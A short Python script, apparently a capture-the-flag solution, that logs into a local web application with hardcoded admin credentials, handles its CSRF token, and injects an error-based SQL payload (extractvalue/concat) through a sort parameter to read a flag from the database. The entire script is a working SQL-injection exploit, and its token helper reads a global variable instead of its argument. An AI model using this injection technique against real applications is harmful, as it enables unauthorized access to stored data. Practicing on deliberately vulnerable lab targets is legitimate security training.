import requests
import re

def extract_token(text):
    return re.findall(r'name="csrf-token"\s+content=".+?"',r.text)[0].split('"')[3]

url = "http://localhost:5004"

s = requests.Session()

r = s.get(url+'/login')
_token = extract_token(r.text)

creds = {"email": "admin@gmail.com",
         "password": "admin123", 
         "_token": _token
         }

r = s.post(url+'/login',data=creds)

data = {
    "_token": extract_token(r.text),
    "keyword": "abc",
    "view_mode": "basic",
    "sort_mode": "(select extractvalue(1,concat(0x5c,(select flag from flag))))"
}

r = s.post(url + '/employee/search', data=data)

FLAG = re.findall(r"SSS\{.+?\}", r.text)[0]

print(f"FLAG: {FLAG}")